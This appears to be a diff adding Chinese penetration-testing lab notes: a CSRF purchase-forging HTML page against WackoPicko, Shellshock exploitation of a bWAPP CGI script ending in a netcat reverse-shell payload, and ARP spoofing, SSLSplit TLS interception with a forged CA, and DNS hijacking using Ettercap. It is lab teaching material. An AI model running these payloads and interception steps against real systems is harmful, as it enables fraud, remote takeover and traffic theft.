@@ -1095,7 +1095,7 @@ ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公�
 
    ```bash
    msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.2.174
-   msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443
+   
    ```
 
 6. 设置verbose，这个设置要设置成true才能看到泄露的信息
@@ -1157,41 +1157,270 @@ ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公�
 
 ## 7.6    执行CSRF攻击
 
+**CSRF** 全称Cross-site request forgery，翻译过来就是，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其**点击**恶意链接或者**访问**包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。
+
+CSRF攻击流程：
+
+1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
+
+2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
+
+3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
+
+4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
+
+5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。
+
+CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。
+
+### 在WackoPicko应用上测试CSRF
+
+1. 打开burp，设置浏览器代理。
+2. 注册攻击用户user_attack，登录[owaspbwa][]/WackoPicko，完成一次购买图片的过程，利用burp分析购买过程的流量。
+
+![](./pictures/CSRF_WackoPicko_1.png)
+
+3. 攻击者上传一张图片，记录下地址栏中图片id=19。根据购买流量，构造如下html文件，存放在/var/www/html/wackopurchase.html。并移动Apache服务`service apache2 start`（这里将Kali机器作为恶意网站服务器）。
+
+```html
+<html>
+<head></head>
+<body onLoad='window.location="http://192.168.2.167/WackoPicko/cart/action.php?action=purchase";setTimeout("window.close;",1000)'>
+<h1>Error 404: Not found</h1>
+<iframe src="http://192.168.2.167/WackoPicko/cart/action.php?
+action=add&picid=19">
+<iframe src="http://192.168.2.167/WackoPicko/cart/review.php" >
+<iframe src="http://192.168.2.167/WackoPicko/cart/confirm.php">
+</iframe>
+</iframe>
+</iframe>
+</body>
+```
+
+4. 在刚刚上传的图片下方添加如下评论，其中192.168.254.130是kali的ip地址。
+
+```html
+There is more pictures <a href="http://192.168.254.130/wackopurchase.html" target="_blank">this</a>
+```
+
+5. 注册受害者user_victim，浏览刚刚上传的图片，并点击评论中的链接，可以发现受害者购买了攻击者上传的图片并支付了15Tradebuxs。美中不足的是，购买成功后应该关闭购买页面，并显示404页面，实践中停留在了购买成功的页面。修改恶意网页代码，实现关闭购买页面功能。
+
+```html
+<html>
+<head></head>
+<body>
+<img src="http://192.168.2.167/WackoPicko/cart/action.php?action=add&picid=19" border="0" style="display:none;"/>
+<img src="http://192.168.2.167/WackoPicko/cart/review.php" border="0" style="display:none;"/>
+<img src="http://192.168.2.167/WackoPicko/cart/confirm.php" border="0" sytle="display:none;"/>
+<img src="http://192.168.2.167/WackoPicko/cart/action.php?action=purchase" border="0" style="display:none";/>
+<h1>Error 404: Not found</h1>
+</body>
+
+```
+
+![](./pictures/CSRF_WackoPicko_2.png)
+
+### CSRF攻击的条件
+
+1. 了解执行特殊操作所需的请求过程及参数；
+2. 将请求过程自动化，并有方法诱使受害者访问恶意站点。
 
 
-CSRF   
 
-   
+## 7.7 shellshock破壳漏洞利用
 
-   
+### shellshock漏洞
 
-   
+**复现**
 
-   
+在bash shell中执行
 
-   
+```bash
+env x='() { :; }; echo vulnerable' bash -c "echo this is a test"
+```
 
-   
+如果输出
 
-   
+```
+vulnerable
+this is a test
+```
 
-   
+表示存在漏洞。这里`{ :; }`表示函数体为空。
 
-   
+**漏洞原因分析**
 
-   
+bash中存在一种使用环境变量定义函数的方法，如果环境变量的值以字符`(){`开头，这个变量会被当作一个导入的函数，这种函数定义只有在shell 启动时生效。
 
-   
+env命令代表“先设置环境变量，再运行后面的程序”。
 
-   
+bash漏洞是由于bash在处理含有函数定义诸如”`() { :; }`“的环境变量赋值的代码上存在设计缺陷，错误地将函数定义后面的字符串作为命令执行。
 
-   
+**影响范围**
+
+bash版本低于4.3均存在该漏洞，并且可以为bash传递环境变量的程序均受影响，最典型的是bash写的CGI程序，客户端通过在请求字符串里加入构造的值，就可以轻松攻击运行CGI的服务器。
+
+目前大多数的网站很少用CGI了，所以问题不算太大。但是有很多的网络设备，如路由器、交换机等都使用了Perl或者其他语言编写的CGI程序，只要是底层调用了bash，那么就爱存在风险。
+
+任何已知程序，只要满足以下两个条件就可以被用来通过bash漏洞导致任意命令执行：
+
+1、程序在某一时刻使用bash作为脚本解释器处理环境变量赋值； 2、环境变量赋值字符串的提交取决于用户输入。
+
+### 漏洞利用
+
+1. 登录bwapp，选择shellshock vulnerability(CGI)
+2. 利用burp suite查看网络数据包
+
+![](pictures/shellshock_burp_1.png)
+
+可以看到有个iframe调用了shell脚本，可能存在shellshock漏洞。
+
+3. 将/bWAPP/cgi-bin/shellshock.sh请求发送到repeater，修改Referer内容为`() { :;}; echo "vulnerable:"`
+
+![](pictures/shellshock_burp_2.png)
+
+可以看到响应多了一个协议头参数`vulnerable`，这是因为它将echo命令的输出集成到了HTTP协议头中。值得注意的是，`()`后面要有空格，`{`与`:`中间也要有空格。
+
+4. 使用下面的命令重复上面的过程
+
+`() { :;}; echo "vulnerable:" $(/bin/sh -c "/sbin/ifconfig")`
+
+![](pictures/shellshock_burp_3.png)
+
+5. 能够在远程服务器上执行命令，自然可以获得远程shell。在kali中打开终端，监听端口`nc -vlp 12345`。修改Referer的值为`() { :;}; echo "Vulnerable:" $(/bin/sh -c "nc -e /bin/bash 192.168.56.1 12345")`，可以看到反弹shell建立成功
+
+![](pictures/shellshock_nc_1.png)
+
+Web 服务器中存在漏洞，因为 CGI 事先将请求的所有部分映射为环境变量,所以这个攻击通过User-Agent 或者 Accept-Language 也能工作。
+
+# 第八章 中间人攻击
+
+## 8.1 使用Ettercap执行ARP欺骗攻击
+
+### 准备
+
+地址解析协议(ARP)欺骗可能是最常见的 MITM 攻击。它基于一个事实，就是 ARP 并不验证系统所收到的响应。这就意味着,当 Alice 的电脑询问网络上的所有设备，“IP xxx.xxx.xxx.xxx 的机器的 MAC 地址是什么”时，它会信任从任何设备得到的答复。该设备可能是预期的服务器，也可能是不是。ARP 欺骗或毒化的工作方式是，发送大量 ARP 响应给通信的两端，告诉每一端攻击者的 MAC 地址对应它们另一端的 IP 地址。
+
+win7虚拟机（192.168.254.128）作为客户端，Bee-box虚拟机（192.168.254.132）作为服务器，Kali虚拟机（192.168.254.130）作为中间人。
+
+### 步骤
+
+1. 在Kali 虚拟机上运行`ettercap -G`,打开图形界面ettercap
+
+![](pictures/MITM_ettercap_1.png)
+
+2. 选择网卡eth0，点击菜单栏中的对号，开始监听网卡eth0
+
+![](pictures/MITM_ettercat_2.png)
+
+3. 点击菜单栏中三个点一样的按钮，执行`Hosts | Scan for hosts`，再点击`Host Lists`按钮，列出发现的主机。
+
+![](pictures/MITM_ettercap_3.png)
+
+4. 选择`192.168.254.128`，再点击`Add to Target1`将其添加到target1，同理将`192.168.254.132`添加到target2
+5. 设置好目标后，点击地球按钮，执行ARP poisoning，参数勾选sniff remote connections
+
+![](pictures/MITM_ettercap_4.png)
+
+6. 在win7虚拟机中访问<http://192.168.254.132/bWAPP>，输入用户名/密码，可以在ettercap中看到输入的内容，貌似Kali虚拟机中的浏览器也会打开win7虚拟机访问的页面。
+
+![](pictures/MITM_ettercap_5.png)
+
+## 8.2 使用Wireshark执行MITM以及捕获流量
+
+kali虚拟机中的wireshark可以抓到其他虚拟机的ip数据
+
+## 8.3修改服务器与客户端之间的数据
+
+将修改规则写成脚本，并用Ettercap编译成过滤器，最后使用ettercap加载过滤器，即可修改中间数据。
 
 
 
+## 8.4 SSL中间人攻击
 
+### 准备
 
+SSL中间人攻击需要的条件是，攻击者作为客户端和服务器之间的中间人，对客户端伪装成服务器，对服务器伪装成客户端，伪装服务器需要伪造证书。
 
+首先使用openssl生成证书私钥，再生成私钥签名的证书。生成证书需要填一些证书颁发信息，可以随意。
 
+```
+openssl genrsa -out certauth.key 4096   生成证书私钥
+openssl req -new -x509 -days 1096 -key certauth.key -out ca.crt
+```
 
+我们使用工具sslsplit开展中间人攻击，sslsplit使用8080、8443端口，因此需要将中间人的流量重定向到8080、8443端口。
 
+```
+echo 1 > /proc/sys/net/ipv4/ip_forwar		开启中间人系统的路由功能
+iptables -t nat -L    						查看iptables的nat表中内容
+iptables -t nat -L > iptables.nat.bkp.txt	备份nat表
+iptables -t nat -F							清空nat表
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --toports
+8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --toports
+8443										建立PREROUTING重定向规则
+```
+
+开展ARP欺骗使Kali机器成为win7虚拟机（192.168.254.128）和网关(192.168.254.2)的中间人。
+
+### 步骤
+
+1. 创建目录用于存放sslsplit日志
+
+```bash
+mkdir /sslsplit
+mkdir /sslsplit/logdir
+```
+
+2. 启动 SSLSplit:
+
+```
+sslsplit -D -l connections.log -j sslsplit/ -S sslsplit/logdir/ -k certauth.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
+```
+
+3. 将生成的证书ca.crt拷贝到win7虚拟机，安装到受信任根证书颁发机构
+4. 在win7虚拟机中打开百度，并搜索hello，可以在sslsplit/logdir/中看到双方传输的信息，还有大量不可见数据包，主要是图片。
+
+![](pictures/sslsplit_1.png)
+
+### 原理
+
+**SSLSplit参数**
+
++ -D : 这是在前台运行 SSLSplit,并不是守护进程,并带有详细的输出。
++ -l connections.log : 这将每个连接的记录保存到当前目录的 connections.log 中。
++ -j /tmp/sslsplit : 这用于建立 jail directory 目录, /sslsplit 会作为root( chroot )包含 SSLSplit 的环境。
++ -S logdir : 这用于告诉 SSLSplit 将内容日志(所有请求和响应)保存到 logdir (在jail目
+  录中)，并将数据保存到单独的文件中。
++ -k 和 -c : 这用于指明和充当 CA 时,SSLSplit 所使用的私钥和证书。
++ ssl 0.0.0.0 8443 : 这告诉 SSLSplit 在哪里监听 HTTPS(或者其它加密协议)连接。要记
+  住这是我们在上一章中使用 iptables 从 443 转发的接口。
++ tcp 0.0.0.0 8080 : 这告诉 SSLSplit 在哪里监听 HTTP 连接。要记住这是我们在上一章中使用 iptables 从 80 转发的接口。
+
+由于bee-box靶机上tls版本较低，使用sslsplit连接失败，因而对win7和网关开展中间人攻击，并在公网中测试。
+
+浏览器不信任我们自己生成的证书，因而需要将证书安装到win7虚拟机中。
+
+## 8.6 DNS劫持
+
+### 步骤
+
+1. 启动Kali机器的Apache服务，`service apache2 start`
+2. 编辑/etc/ettercap/etter.dns，添加下面内容，所有 A 记录(地址记录)都解析到 192.168.254.130 ，这是我们 Kali的地址。
+
+```
+* A 192.168.254.130
+```
+
+3. 打开ettercap `ettercap -G`，对win7虚拟机（192.168.254.128）和网关（192.168.254.2）开展ARP欺骗，再选择`plugins | manage the plugins`，双击dns_spoof，执行dns欺骗攻击。
+
+![](pictures/dns_1.png)
+
+可以看到DNS劫持成功
+
+4. 在win7虚拟机中打开http网页，可以发现网页已被劫持。由于kali中apache服务未搭建https服务，因而在客户机中打开https网页会报错。
+
+### 原理
+
+DNS劫持可以强制客户端浏览某个页面，可以用于web渗透。
